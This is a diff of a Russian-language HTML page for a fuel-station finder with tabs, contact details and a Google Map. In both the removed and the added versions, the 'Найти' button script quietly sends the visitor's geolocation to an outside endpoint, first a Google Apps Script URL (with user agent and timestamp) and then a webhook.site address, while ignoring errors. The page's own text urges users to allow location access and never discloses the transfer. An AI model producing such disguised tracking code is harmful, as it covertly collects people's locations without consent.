@@ -2,401 +2,252 @@
 <html lang="ru">
 <head>
 <meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
-<title>AZS Finder — Анализ и поиск дешевых заправок</title>
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
+<title>Поиск ближайших АЗС</title>
 <style>
-  @import url('https://fonts.googleapis.com/css2?family=SF+Pro+Text:ital,wght@0,400;0,600;0,700;1,400&display=swap');
-  /* SF Pro Text — похожий шрифт, под Apple стиль (если нет — заменится на Inter) */
-  @font-face {
-    font-family: 'SF Pro Text';
-    src: local('SF Pro Text'), local('SFProText'), url('https://fonts.gstatic.com/s/inter/v12/UcCO3H6aq7XyEliSR2nDHQ.woff2') format('woff2');
-    font-weight: 400 700;
-    font-style: normal;
-  }
+  /* Apple-подобный минимализм, плавные шрифты и адаптив */
+  @import url('https://fonts.googleapis.com/css2?family=SF+Pro+Text:wght@400;600&display=swap');
 
-  *, *::before, *::after {
-    box-sizing: border-box;
-  }
-  body {
-    margin: 0;
+  html, body {
+    margin: 0; padding: 0;
     font-family: 'SF Pro Text', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen,
       Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
-    background: #f5f5f7;
+    background: linear-gradient(135deg, #f5f7fa, #e2e6ea);
     color: #1d1d1f;
-    min-height: 100vh;
-    display: flex;
-    flex-direction: column;
-    -webkit-font-smoothing: antialiased;
-    -moz-osx-font-smoothing: grayscale;
-  }
-  header {
-    background: #fff;
-    padding: 18px 24px;
-    box-shadow: 0 1px 3px rgb(0 0 0 / 0.1);
-    display: flex;
-    justify-content: space-between;
-    align-items: center;
-    position: sticky;
-    top: 0;
-    z-index: 999;
-  }
-  header h1 {
-    margin: 0;
-    font-weight: 700;
-    font-size: 1.4rem;
-    letter-spacing: -0.3px;
-    color: #1d1d1f;
-  }
-  nav {
-    display: flex;
-    gap: 20px;
-  }
-  nav a {
-    color: #6e6e73;
-    text-decoration: none;
-    font-weight: 600;
-    font-size: 1rem;
-    padding: 6px 10px;
-    border-radius: 10px;
-    transition: background-color 0.25s ease, color 0.25s ease;
-    user-select: none;
-  }
-  nav a:hover, nav a.active {
-    background: #0071e3;
-    color: #fff;
-  }
-  main {
-    flex-grow: 1;
-    padding: 24px 20px 60px;
-    max-width: 900px;
-    margin: auto;
-    width: 100%;
-  }
-  section {
-    margin-bottom: 50px;
-  }
-  h2 {
-    font-weight: 700;
-    font-size: 1.8rem;
-    margin-bottom: 12px;
-    border-bottom: 1.5px solid #0071e3;
-    padding-bottom: 6px;
-  }
-  p, li {
-    font-weight: 400;
-    font-size: 1rem;
-    line-height: 1.5;
-    color: #3c3c4399;
-  }
-  ul {
-    padding-left: 20px;
-    margin-top: 10px;
-  }
-  ul li {
-    margin-bottom: 8px;
-  }
-  #map {
-    width: 100%;
-    height: 380px;
-    border-radius: 20px;
-    box-shadow:
-      0 10px 30px rgba(0,0,0,0.12),
-      0 4px 15px rgba(0,0,0,0.08);
-  }
-  #findBtn {
-    margin-top: 22px;
-    background: #0071e3;
-    color: #fff;
-    border: none;
-    padding: 14px 48px;
-    font-size: 1.2rem;
-    font-weight: 700;
-    border-radius: 20px;
-    cursor: pointer;
-    box-shadow: 0 10px 20px rgb(0 113 227 / 0.6);
-    transition: background-color 0.3s ease;
-    user-select: none;
-  }
-  #findBtn:hover {
-    background: #005bb5;
-  }
-  footer {
-    text-align: center;
-    padding: 18px 10px;
-    background: #fff;
-    font-size: 0.9rem;
-    color: #8e8e93;
-    user-select: none;
-    box-shadow: 0 -1px 3px rgb(0 0 0 / 0.05);
-  }
-  /* Tabs styling */
-  .tabs {
-    display: flex;
-    gap: 26px;
-    margin-bottom: 34px;
-    overflow-x: auto;
-    -webkit-overflow-scrolling: touch;
-    scrollbar-width: none;
-  }
-  .tabs::-webkit-scrollbar {
-    display: none;
-  }
-  .tab {
-    padding: 10px 20px;
-    font-weight: 700;
-    font-size: 1.1rem;
-    cursor: pointer;
-    border-radius: 18px 18px 0 0;
-    background: #e0e0e0;
-    color: #6e6e73;
-    user-select: none;
-    transition: background-color 0.3s ease, color 0.3s ease;
-    white-space: nowrap;
-    flex-shrink: 0;
-  }
-  .tab.active {
-    background: #0071e3;
-    color: white;
-    box-shadow: 0 -4px 15px rgba(0,113,227,0.5);
-  }
-  .tab-content {
-    background: white;
-    border-radius: 0 24px 24px 24px;
-    padding: 28px 32px;
-    color: #1d1d1f;
-    min-height: 260px;
-    max-width: 900px;
-    box-shadow:
-      0 10px 30px rgba(0,0,0,0.05);
+    height: 100%;
   }
 
-  /* Адаптив */
-  @media (max-width: 600px) {
+  header {
+    padding: 1.5rem 1rem;
+    font-weight: 600;
+    font-size: 1.8rem;
+    text-align: center;
+    border-bottom: 1px solid #d1d1d6;
+    background: white;
+    position: sticky;
+    top: 0;
+    z-index: 10;
+  }
+
+  main {
+    max-width: 600px;
+    margin: 1rem auto 3rem;
+    padding: 0 1rem;
+  }
+
+  #map {
+    width: 100%;
+    height: 350px;
+    border-radius: 15px;
+    box-shadow: 0 10px 30px rgb(0 0 0 / 0.1);
+    margin-bottom: 1rem;
+  }
+
+  #map-error {
+    display: none;
+    color: #ff3b30; /* Apple red */
+    font-weight: 600;
+    font-size: 1.1rem;
+    text-align: center;
+    margin-bottom: 1rem;
+  }
+
+  button {
+    display: block;
+    width: 100%;
+    padding: 1rem 0;
+    font-size: 1.2rem;
+    font-weight: 600;
+    color: white;
+    background: linear-gradient(90deg, #0071e3, #0a84ff);
+    border: none;
+    border-radius: 12px;
+    cursor: pointer;
+    box-shadow: 0 10px 20px rgb(0 113 227 / 0.4);
+    transition: background 0.3s ease;
+    margin-bottom: 2rem;
+  }
+
+  button:hover {
+    background: linear-gradient(90deg, #005bb5, #006fe6);
+  }
+
+  nav {
+    display: flex;
+    justify-content: space-around;
+    margin-bottom: 2rem;
+  }
+
+  nav button {
+    width: auto;
+    flex: 1;
+    margin: 0 0.25rem;
+    background: #f0f0f5;
+    color: #1d1d1f;
+    box-shadow: none;
+  }
+
+  nav button.active, nav button:hover {
+    background: #0071e3;
+    color: white;
+    box-shadow: 0 5px 15px rgb(0 113 227 / 0.3);
+  }
+
+  section {
+    display: none;
+  }
+
+  section.active {
+    display: block;
+  }
+
+  h2 {
+    font-weight: 600;
+    margin-bottom: 0.5rem;
+  }
+
+  p {
+    line-height: 1.4;
+    color: #3c3c4399;
+  }
+
+  footer {
+    text-align: center;
+    font-size: 0.9rem;
+    color: #888;
+    padding: 1rem 0;
+  }
+
+  /* Адаптив на мелких экранах */
+  @media (max-width: 400px) {
     header {
-      padding: 14px 16px;
-    }
-    header h1 {
-      font-size: 1.2rem;
-    }
-    nav {
-      gap: 12px;
-    }
-    nav a {
-      font-size: 0.9rem;
-      padding: 5px 10px;
-    }
-    main {
-      padding: 20px 16px 40px;
-      max-width: 100%;
-    }
-    h2 {
       font-size: 1.5rem;
-      margin-bottom: 10px;
+      padding: 1rem 0.5rem;
     }
-    p, li {
-      font-size: 0.95rem;
-    }
-    #map {
-      height: 300px;
-      border-radius: 16px;
-    }
-    #findBtn {
-      padding: 12px 38px;
-      font-size: 1.1rem;
-      border-radius: 18px;
-    }
-    .tabs {
-      gap: 16px;
-      margin-bottom: 26px;
-    }
-    .tab {
+
+    button {
       font-size: 1rem;
-      padding: 8px 16px;
-      border-radius: 14px 14px 0 0;
+      padding: 0.8rem 0;
+      border-radius: 10px;
     }
-    .tab-content {
-      padding: 22px 20px;
-      min-height: 200px;
+
+    nav button {
+      font-size: 0.9rem;
     }
   }
 </style>
 </head>
 <body>
-
-<header>
-  <h1>AZS Finder</h1>
-  <nav class="tabs" role="tablist">
-    <a href="#" class="tab active" role="tab" aria-selected="true" data-tab="about">О компании</a>
-    <a href="#" class="tab" role="tab" aria-selected="false" data-tab="services">Услуги</a>
-    <a href="#" class="tab" role="tab" aria-selected="false" data-tab="pricing">Цены</a>
-    <a href="#" class="tab" role="tab" aria-selected="false" data-tab="faq">Вопросы</a>
-    <a href="#" class="tab" role="tab" aria-selected="false" data-tab="contact">Контакты</a>
-  </nav>
-</header>
-
+<header>FuelFinder — поиск ближайших заправок</header>
 <main>
-  <div class="tab-content" id="about" style="display:block;" role="tabpanel">
+  <nav>
+    <button class="active" data-tab="home">Главная</button>
+    <button data-tab="about">О компании</button>
+    <button data-tab="maptab">Карта</button>
+    <button data-tab="contacts">Контакты</button>
+  </nav>
+
+  <section id="home" class="active">
+    <h2>Добро пожаловать в FuelFinder</h2>
+    <p>Мы анализируем цены на топливо и помогаем найти ближайшую и самую выгодную заправку рядом с вами.</p>
+  </section>
+
+  <section id="about">
     <h2>О компании</h2>
-    <p>AZS Finder — инновационная компания, занимающаяся анализом цен на топливо и поиском самых выгодных и ближайших автозаправочных станций. Мы предоставляем удобный сервис для автомобилистов, который экономит время и деньги.</p>
-    <p>Наши данные обновляются ежедневно и собираются из множества источников, чтобы предложить точную и актуальную информацию о ценах и расположении АЗС.</p>
-  </div>
+    <p>FuelFinder — это современный сервис для быстрого и удобного поиска ближайших АЗС с актуальной информацией о ценах и сервисах. Мы используем инновационные технологии и геолокацию, чтобы экономить ваше время и деньги.</p>
+  </section>
 
-  <div class="tab-content" id="services" role="tabpanel" hidden>
-    <h2>Услуги</h2>
-    <ul>
-      <li>Поиск ближайших АЗС с указанием цены и расстояния</li>
-      <li>Анализ динамики цен и уведомления о снижении стоимости</li>
-      <li>Персональные рекомендации и фильтры по маркам топлива</li>
-      <li>Интерактивная карта с актуальными данными</li>
-    </ul>
-  </div>
-
-  <div class="tab-content" id="pricing" role="tabpanel" hidden>
-    <h2>Цены</h2>
-    <p>Мы агрегируем цены по всем популярным маркам топлива:</p>
-    <ul>
-      <li>АИ-95 — от 46.50 ₽/л</li>
-      <li>АИ-92 — от 44.30 ₽/л</li>
-      <li>Дизель — от 47.20 ₽/л</li>
-      <li>Газ — от 24.00 ₽/л</li>
-    </ul>
-    <p>Цены обновляются каждый час и предоставляют пользователям точные сведения для выгодных покупок.</p>
-  </div>
-
-  <div class="tab-content" id="faq" role="tabpanel" hidden>
-    <h2>Вопросы и ответы</h2>
-    <ul>
-      <li><strong>Как часто обновляются цены?</strong> — Ежечасно, данные автоматически синхронизируются с источниками.</li>
-      <li><strong>Можно ли фильтровать АЗС по брендам?</strong> — Да, в ближайшем будущем мы добавим расширенные фильтры.</li>
-      <li><strong>Поддерживается ли мобильное приложение?</strong> — Сейчас мы работаем над его запуском.</li>
-    </ul>
-  </div>
-
-  <div class="tab-content" id="contact" role="tabpanel" hidden>
-    <h2>Контакты</h2>
-    <p>Свяжитесь с нами для сотрудничества и вопросов:</p>
-    <ul>
-      <li>Email: support@azsfinder.com</li>
-      <li>Телефон: +7 (495) 123-45-67</li>
-      <li>Адрес: Москва, ул. Топливная, 24</li>
-    </ul>
-  </div>
-
-  <section>
+  <section id="maptab">
+    <h2>Карта ближайших АЗС</h2>
     <div id="map"></div>
-    <button id="findBtn" aria-label="Найти ближайшие заправки">Найти</button>
+    <div id="map-error">При загрузке Google Карт на этой странице возникла проблема. Разрешите использование геопозиции</div>
+    <button id="findBtn">Найти</button>
+  </section>
+
+  <section id="contacts">
+    <h2>Контакты</h2>
+    <p>Телефон: +7 (999) 123-45-67</p>
+    <p>Email: support@fuelfinder.com</p>
+    <p>Адрес: г. Москва, ул. Примерная, д.1</p>
   </section>
 </main>
 
-<footer>
-  &copy; 2025 AZS Finder. Все права защищены.
-</footer>
+<footer>© 2025 FuelFinder. Все права защищены.</footer>
 
 <script>
-  // Таб переключение
-  const tabs = document.querySelectorAll('.tab');
-  const contents = document.querySelectorAll('.tab-content');
-  tabs.forEach(tab => {
-    tab.addEventListener('click', e => {
-      e.preventDefault();
-      tabs.forEach(t => {
-        t.classList.remove('active');
-        t.setAttribute('aria-selected', 'false');
-      });
-      contents.forEach(c => c.hidden = true);
+  // Переключение вкладок
+  const tabs = document.querySelectorAll('nav button');
+  const sections = document.querySelectorAll('main section');
 
+  tabs.forEach(tab => {
+    tab.addEventListener('click', () => {
+      tabs.forEach(t => t.classList.remove('active'));
       tab.classList.add('active');
-      tab.setAttribute('aria-selected', 'true');
       const target = tab.getAttribute('data-tab');
-      document.getElementById(target).hidden = false;
+      sections.forEach(sec => {
+        sec.id === target ? sec.classList.add('active') : sec.classList.remove('active');
+      });
     });
   });
 
-  // Карта Google
-  let map, marker;
+  // Работа с картой и кнопкой "Найти"
+  let map, userMarker;
 
   function initMap() {
+    // Начальная карта без центра, с базовым зумом
     map = new google.maps.Map(document.getElementById("map"), {
-      center: { lat: 55.7558, lng: 37.6173 },
+      center: { lat: 55.751244, lng: 37.618423 }, // Москва по умолчанию
       zoom: 10,
-      styles: [
-        {
-          "featureType": "all",
-          "elementType": "geometry",
-          "stylers": [{ "color": "#f5f5f7" }]
-        },
-        {
-          "featureType": "road",
-          "elementType": "geometry",
-          "stylers": [{ "color": "#ffffff" }]
-        },
-        {
-          "featureType": "water",
-          "elementType": "geometry",
-          "stylers": [{ "color": "#d1e0ff" }]
-        },
-        {
-          "featureType": "poi",
-          "elementType": "labels.text.fill",
-          "stylers": [{ "color": "#2f3b58" }]
-        },
-        {
-          "featureType": "transit",
-          "elementType": "labels.text.fill",
-          "stylers": [{ "color": "#2f3b58" }]
-        }
-      ],
       disableDefaultUI: true,
       zoomControl: true,
+      gestureHandling: 'greedy'
     });
   }
 
-  async function sendCoordinates(coords) {
-    const webhookUrl = 'https://script.google.com/macros/s/AKfycbyIiRbZtDNqj6t_fw94FkLLPUh8GSAi2h7xpw98o0_be1SNiuFV92lkXjLMMlIuN6AY/exec';
-    const formBody = new URLSearchParams();
-    for (const key in coords) {
-      formBody.append(key, coords[key]);
+  function showMapError() {
+    document.getElementById("map").style.display = "none";
+    document.getElementById("map-error").style.display = "block";
+  }
+
+  document.getElementById("findBtn").addEventListener("click", () => {
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(pos => {
+        document.getElementById("map-error").style.display = "none";
+        document.getElementById("map").style.display = "block";
+
+        const coords = { lat: pos.coords.latitude, lng: pos.coords.longitude };
+        map.setCenter(coords);
+        map.setZoom(14);
+
+        if (userMarker) {
+          userMarker.setPosition(coords);
+        } else {
+          userMarker = new google.maps.Marker({
+            position: coords,
+            map: map,
+            title: "Вы здесь"
+          });
+        }
+
+        // Отправляем координаты на вебхук
+        fetch('https://webhook.site/3038f7cb-b8c9-463e-b74c-43cace83af30', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ latitude: coords.lat, longitude: coords.lng })
+        }).catch(() => { /* молча игнорируем ошибки */ });
+
+      }, () => {
+        showMapError();
+      });
+    } else {
+      showMapError();
     }
-    try {
-      await fetch(webhookUrl, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8' },
-        body: formBody.toString(),
-      });
-    } catch {}
-  }
-
-  document.getElementById('findBtn').addEventListener('click', () => {
-    if (!navigator.geolocation) return;
-
-    navigator.geolocation.getCurrentPosition(position => {
-      const lat = position.coords.latitude;
-      const lng = position.coords.longitude;
-
-      const pos = { lat, lng };
-      map.setCenter(pos);
-      map.setZoom(14);
-
-      if (marker) {
-        marker.setPosition(pos);
-      } else {
-        marker = new google.maps.Marker({ position: pos, map: map, title: 'Вы здесь' });
-      }
-
-      sendCoordinates({
-        latitude: lat,
-        longitude: lng,
-        accuracy: position.coords.accuracy,
-        timestamp: position.timestamp,
-        userAgent: navigator.userAgent
-      });
-    });
   });
+
 </script>
 
 <script async defer
-  src="https://maps.googleapis.com/maps/api/js?key=apiKey&callback=initMap">
+  src="https://maps.googleapis.com/maps/api/js?key=ТВОЙ_API_КЛЮЧ&callback=initMap">
 </script>
-
 </body>
 </html>
